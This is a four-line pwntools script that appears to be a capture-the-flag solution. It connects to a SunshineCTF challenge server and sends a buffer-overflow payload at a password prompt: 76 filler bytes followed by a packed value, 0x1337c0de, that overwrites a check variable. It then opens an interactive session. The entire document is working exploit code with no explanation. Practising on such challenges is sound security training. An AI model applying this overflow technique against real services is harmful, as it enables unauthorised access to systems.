from pwn import *
p = remote("chal.sunshinectf.games", 25601)
p.sendlineafter(b"password: ", b"A"*76 + p64(0x1337c0de))
p.interactive()
